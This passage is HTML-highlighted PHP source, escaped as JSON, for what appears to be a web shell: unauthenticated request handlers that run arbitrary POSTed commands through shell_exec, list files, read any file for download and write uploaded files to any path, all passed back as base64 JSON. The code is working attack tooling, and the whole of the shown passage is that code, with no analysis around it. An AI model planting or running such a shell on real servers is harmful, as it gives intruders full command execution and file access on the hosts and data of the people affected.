class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003efeaturePwd\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;cwd\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003egetcwd\u003c/span\u003e\u003cspan class=\"p\"\u003e()));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003efeatureHint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fileName\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$type\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;cmd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;compgen -c \u003c/span\u003e\u003cspan class=\"si\"\u003e$fileName\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;compgen -f \u003c/span\u003e\u003cspan class=\"si\"\u003e$fileName\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/bin/bash -c \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e$cmd\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"si\"\u003e$files\u003c/span\u003e\u003cspan class=\"s2\"\u003e = explode(\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;, shell_exec(\u003c/span\u003e\u003cspan class=\"si\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    foreach (\u003c/span\u003e\u003cspan class=\"si\"\u003e$files\u003c/span\u003e\u003cspan class=\"s2\"\u003e as \u0026amp;\u003c/span\u003e\u003cspan class=\"si\"\u003e$filename\u003c/span\u003e\u003cspan class=\"s2\"\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u003c/span\u003e\u003cspan class=\"si\"\u003e$filename\u003c/span\u003e\u003cspan class=\"s2\"\u003e = base64_encode(\u003c/span\u003e\u003cspan class=\"si\"\u003e$filename\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    return array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026#39;files\u0026#39; =\u0026gt; \u003c/span\u003e\u003cspan class=\"si\"\u003e$files\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003efunction featureDownload(\u003c/span\u003e\u003cspan class=\"si\"\u003e$filePath\u003c/span\u003e\u003cspan class=\"s2\"\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"si\"\u003e$file\u003c/span\u003e\u003cspan class=\"s2\"\u003e = @file_get_contents(\u003c/span\u003e\u003cspan class=\"si\"\u003e$filePath\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    if (\u003c/span\u003e\u003cspan class=\"si\"\u003e$file\u003c/span\u003e\u003cspan class=\"s2\"\u003e === FALSE) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        return array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;stdout\u0026#39; =\u0026gt; base64_encode(\u0026#39;File not found / no read permission.\u0026#39;),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;cwd\u0026#39; =\u0026gt; base64_encode(getcwd())\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        return array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;name\u0026#39; =\u0026gt; base64_encode(basename(\u003c/span\u003e\u003cspan class=\"si\"\u003e$filePath\u003c/span\u003e\u003cspan class=\"s2\"\u003e)),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;file\u0026#39; =\u0026gt; base64_encode(\u003c/span\u003e\u003cspan class=\"si\"\u003e$file\u003c/span\u003e\u003cspan class=\"s2\"\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003efunction featureUpload(\u003c/span\u003e\u003cspan class=\"si\"\u003e$path\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$file\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"s2\"\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    chdir(\u003c/span\u003e\u003cspan class=\"si\"\u003e$cwd\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"si\"\u003e$f\u003c/span\u003e\u003cspan class=\"s2\"\u003e = @fopen(\u003c/span\u003e\u003cspan class=\"si\"\u003e$path\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u0026#39;wb\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    if (\u003c/span\u003e\u003cspan class=\"si\"\u003e$f\u003c/span\u003e\u003cspan class=\"s2\"\u003e === FALSE) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        return array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;stdout\u0026#39; =\u0026gt; base64_encode(\u0026#39;Invalid path / no write permission.\u0026#39;),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;cwd\u0026#39; =\u0026gt; base64_encode(getcwd())\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        fwrite(\u003c/span\u003e\u003cspan class=\"si\"\u003e$f\u003c/span\u003e\u003cspan class=\"s2\"\u003e, base64_decode(\u003c/span\u003e\u003cspan class=\"si\"\u003e$file\u003c/span\u003e\u003cspan class=\"s2\"\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        fclose(\u003c/span\u003e\u003cspan class=\"si\"\u003e$f\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        return array(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;stdout\u0026#39; =\u0026gt; base64_encode(\u0026#39;Done.\u0026#39;),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#39;cwd\u0026#39; =\u0026gt; base64_encode(getcwd())\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003efunction initShellConfig() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    global \u003c/span\u003e\u003cspan class=\"si\"\u003e$SHELL_CONFIG\u003c/span\u003e\u003cspan class=\"s2\"\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    if (isRunningWindows()) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u003c/span\u003e\u003cspan class=\"si\"\u003e$username\u003c/span\u003e\u003cspan class=\"s2\"\u003e = getenv(\u0026#39;USERNAME\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        if (\u003c/span\u003e\u003cspan class=\"si\"\u003e$username\u003c/span\u003e\u003cspan class=\"s2\"\u003e !== false) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$SHELL_CONFIG[\u0026#39;username\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"si\"\u003e$username\u003c/span\u003e\u003cspan class=\"s2\"\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u003c/span\u003e\u003cspan class=\"si\"\u003e$pwuid\u003c/span\u003e\u003cspan class=\"s2\"\u003e = posix_getpwuid(posix_geteuid());\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        if (\u003c/span\u003e\u003cspan class=\"si\"\u003e$pwuid\u003c/span\u003e\u003cspan class=\"s2\"\u003e !== false) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$SHELL_CONFIG[\u0026#39;username\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"si\"\u003e$pwuid[\u0026#39;name\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"si\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e = gethostname();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    if (\u003c/span\u003e\u003cspan class=\"si\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e !== false) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u003c/span\u003e\u003cspan class=\"si\"\u003e$SHELL_CONFIG[\u0026#39;hostname\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"si\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eif (isset(\u003c/span\u003e\u003cspan class=\"si\"\u003e$_GET[\u0026#34;feature\u0026#34;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u003c/span\u003e\u003cspan class=\"si\"\u003e$response\u003c/span\u003e\u003cspan class=\"s2\"\u003e = NULL;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    switch (\u003c/span\u003e\u003cspan class=\"si\"\u003e$_GET[\u0026#34;feature\u0026#34;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        case \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003eshell\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;cmd\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            if (!preg_match(\u0026#39;/2\u0026gt;/\u0026#39;, \u003c/span\u003e\u003cspan class=\"si\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u003c/span\u003e\u003cspan class=\"si\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e .= \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$response\u003c/span\u003e\u003cspan class=\"s2\"\u003e = featureShell(\u003c/span\u003e\u003cspan class=\"si\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#34;cwd\u0026#34;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            break;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        case \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003epwd\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$response\u003c/span\u003e\u003cspan class=\"s2\"\u003e = featurePwd();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            break;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        case \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003ehint\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$response\u003c/span\u003e\u003cspan class=\"s2\"\u003e = featureHint(\u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;filename\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;cwd\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;type\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            break;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        case \u0026#39;upload\u0026#39;:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u003c/span\u003e\u003cspan class=\"si\"\u003e$response\u003c/span\u003e\u003cspan class=\"s2\"\u003e = featureUpload(\u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;path\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;file\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e, \u003c/span\u003e\u003cspan class=\"si\"\u003e$_POST[\u0026#39;cwd\u0026#39;]\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    header(\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003eContent\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003eType\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eapplication\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ejson\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    echo json_encode(\u003c/span\u003e\u003cspan class=\"si\"\u003e$response\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    die();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e} else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 